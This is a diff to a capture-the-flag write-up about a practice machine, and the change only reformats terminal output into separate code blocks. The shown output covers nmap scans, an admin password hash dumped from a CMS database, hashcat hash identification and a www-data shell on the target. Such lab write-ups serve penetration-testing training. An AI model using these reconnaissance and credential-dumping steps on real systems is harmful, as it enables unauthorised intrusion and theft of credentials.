@@ -20,6 +20,9 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 16.55 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 22,80                                                                    
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-29 20:44 UTC
@@ -42,6 +45,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-29 20:44 UTC
@@ -268,9 +274,14 @@ MariaDB [subrion]> select * from sbr421_members;
 +----+--------------+----------+--------------------------------------------------------------+--------------------------+---------+--------+---------------------+---------------------+---------------------+-----------+---------------+--------+---------+-------+-----------+----------+---------+-------+----------+-------+----------------+---------------+----------+----------------+--------------+-----------+-----------------+---------------+-------------------+----------------+------------------+----------------+
 |  1 |            1 | admin    | $2y$10$yLtIS38vqzWRmZPY3RxqsetMJRRi6VzaiKdCU53R/bpa4AHhXyZ6G | admin@exfiltrated.offsec |         | active | 2021-06-10 12:04:54 | 2021-06-10 12:04:54 | 2026-01-29 16:15:03 |         1 | Administrator |        |         |       |           |          |         |       |          |  0.00 |              0 |               |        0 | NULL           | NULL         |         0 | NULL            | NULL          |                 0 |                | yes              | en             |
 +----+--------------+----------+--------------------------------------------------------------+--------------------------+---------+--------+---------------------+---------------------+---------------------+-----------+---------------+--------+---------+-------+-----------+----------+---------+-------+----------+-------+----------------+---------------+----------+----------------+--------------+-----------+-----------------+---------------+-------------------+----------------+------------------+----------------+
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ echo '$2y$10$yLtIS38vqzWRmZPY3RxqsetMJRRi6VzaiKdCU53R/bpa4AHhXyZ6G' > admin.hash
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ hashcat --identify admin.hash                                      
 The following 4 hash-modes match the structure of your input hash:
@@ -292,6 +303,9 @@ drwxr-xr-x  3 root root 4096 Jun 10  2021 .
 drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
 -rwxr-xr-x  1 root root  437 Jun 10  2021 image-exif.sh
 drwxr-xr-x  2 root root 4096 Jan 29 21:45 metadata
+```
+
+```bash
 www-data@exfiltrated:/opt$ cat image-exif.sh 
 #! /bin/bash
 #07/06/18 A BASH script to collect EXIF metadata 
